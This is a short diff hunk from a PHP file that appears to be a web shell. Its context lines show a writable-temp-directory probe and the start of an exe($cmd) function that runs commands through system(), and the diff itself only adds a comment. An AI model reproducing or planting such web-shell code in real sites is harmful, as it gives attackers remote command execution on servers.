@@ -25,7 +25,7 @@ function usergroup()
 }
 
 define("MARI_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
-
+// com
 function exe($cmd)
 {
 	if (function_exists('system')) {
